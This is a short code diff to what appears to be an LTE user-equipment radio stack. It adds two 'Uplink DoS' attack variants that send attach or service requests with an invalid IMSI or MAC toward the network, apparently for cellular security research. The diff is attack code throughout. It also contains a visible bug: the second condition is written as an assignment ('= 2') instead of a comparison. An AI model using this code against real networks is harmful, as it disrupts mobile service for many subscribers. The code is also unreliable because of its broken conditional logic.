@@ -571,8 +571,13 @@ static void rrc_ue_generate_RRCConnectionSetupComplete(
   int   nas_msg_length;
 
   // Uplink DoS attack
-  else if (uplink_dos_attack /* != 0 */) {
-    LOG_I(RRC, "[Uplink DoS] encoding service request with invalid MAC\n");
+  if (uplink_dos_attack == 1) {
+    LOG_I(RRC, "[Uplink DoS] Variant 1: encoding service request with invalid IMSI\n");
+    nas_msg = nas_attach_req_imsi;
+    nas_msg_length = sizeof(nas_attach_req_imsi);
+  }
+  else if (uplink_dos_attack = 2) {
+    LOG_I(RRC, "[Uplink DoS] Variant 2: encoding service request with invalid MAC\n");
     nas_msg = _nas_service_request;
     nas_msg_length = sizeof(_nas_service_request);
   }
